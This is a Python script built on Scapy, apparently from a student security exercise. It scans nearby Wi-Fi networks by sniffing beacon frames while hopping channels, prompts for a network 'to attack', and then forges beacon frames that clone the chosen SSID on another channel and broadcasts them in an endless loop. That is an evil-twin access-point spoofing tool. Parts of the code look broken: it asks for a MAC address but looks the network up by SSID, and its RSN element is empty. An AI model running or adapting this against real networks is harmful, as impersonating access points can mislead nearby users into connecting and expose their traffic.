"""

"""

from scapy import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Elt, Dot11ProbeResp
from scapy.sendrecv import sniff, sendp
from scapy.utils import hexdump
import sys
import os
import binascii
import argparse
import time


class SCANNER:

    def __init__(self):
        self.ap_list = {}
        self.interface = ""
        self.channelTarget = {1:6,6:11,11:1}
        self.actualChannel = 1


"""
Get packet
Sources :
# https://xavki.blog/securite-scapy-scanner-les-reseaux-wifi-ssid-et-leur-adresse-mac/
# https://www-npa.lip6.fr/~tixeuil/m2r/uploads/Main/PROGRES2018_APIScapy.pdf
"""
def packetRecup(scanner):
    #probeRespo : contient les informations sur ce que supporte la STA
    def scan(paquet):
        if paquet.haslayer(Dot11Beacon) or paquet.haslayer(Dot11ProbeResp):
            #type 0 => management
            #subtype 8 =>Beacon
            if paquet.type == 0 and paquet.subtype == 8:
                if str(paquet.info, "utf-8") not in scanner.ap_list:
                    scanner.ap_list[str(paquet.info, "utf-8")] = paquet
                    print("Réseau SSID: %s et MAC address: %s " % (paquet.info, paquet.addr2))
                    print("Réseau SSID: %s et MAC address: %s " % (paquet.info, paquet.addr2))
                    print("Réseau BSSID: %s" % ( paquet[Dot11].addr3))
                    print("channel : " + str(int(ord(paquet[Dot11Elt:3].info))))
                    print("capabiliy : " + paquet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\
                    {Dot11ProbeResp:%Dot11ProbeResp.cap%}"))
                    #return "Réseau SSID: %s et MAC address: %s " % (pkt.info, pkt.addr2)
    return scan

def createNetwork(netSSID, scanner, targetChannel):
    srcMacAddress = "22:22:22:22:22:22"
    apMacAddress = '33:33:33:33:33:33'
    # type 0 = management
    # type 8 = Beacon
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                addr2=srcMacAddress, addr3=apMacAddress)

    """
    The "beacon" variable indicates the capabilities of our access point. 
    Here we are saying it is an ESS network and the "privacy" parameter was required for
    the network to appear secured when discovered from an Apple device.
    """
    """
    WPA2, we need to add a Robust Secure Network (RSN)
    """
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=netSSID, len=len(netSSID))
    rsn = Dot11Elt(ID='RSNinfo', info=())
    """rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x00\x0f\xac\x02'  # TKIP Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x00\x00'))  # RSN Capabilities (no extra capabilities)"""

    frame = RadioTap() / dot11 / beacon / essid / rsn

    frame.show()
    print("\nHexdump of frame:")
    hexdump(frame)
    print(f"Choice :{netSSID}")
    if scanner.ap_list.get(str(netSSID, 'utf-8')) != None:
        print(f"res:{scanner.ap_list.get(str(netSSID, 'utf-8'))}")
   
   
    os.system(f"iwconfig {scanner.interface} channel {targetChannel}")

    sendp(frame, iface=scanner.interface, inter=0.100, loop=1)

def chooseNetworkTarget(scanner):
    cpt = 0
    print("List of detected networks")
    for key, values in scanner.ap_list.items():
        print(f"SSID {str(values.info, 'utf-8')}" )
        print(f"MAC {values.addr2}" )
    choice = input("Enter the mac address of ssid to attack")
    pktChoice = scanner.ap_list.get(choice)
    return pktChoice.info # Network name here

def channel_hopper(scanner):
    channelLists = [1, 6, 11]
    for i in channelLists:
        try:
            print(f"iwconfig {scanner.interface} channel {i}")
            os.system(f"iwconfig {scanner.interface} channel {i}")
            time.sleep(0.5)
            #os.system("iw dev %s set channel %d" % (scanner.interface, i))
            sniff(iface=scanner.interface, prn=packetRecup(scanner))
        except KeyboardInterrupt:
           continue

def main():
    scanner = SCANNER()
        # Passing arguments
    parser = argparse.ArgumentParser(prog="Scapy wifi scanner",
                                    usage="%(prog)s -i wlan0mon",
                                    description="Scapy scanner Wifi",
                                    allow_abbrev=True)
    parser.add_argument("-i", "--Interface", required=True,
                        help="The interface that you want to send packets out of, needs to be set to monitor mode")
    args = parser.parse_args()

    #sniff(iface=args.Interface, prn=packetRecup(scanner))

    scanner.interface = args.Interface # Interface name here
    channel_hopper(scanner)
    choice = chooseNetworkTarget(scanner)

    originalChannel = scanner.ap_list.get(str(choice, "utf-8"))[Dot11Elt:3].info
    channel = int(ord(originalChannel))
    ch = scanner.channelTarget.get(channel)
    createNetwork(choice, scanner, ch)
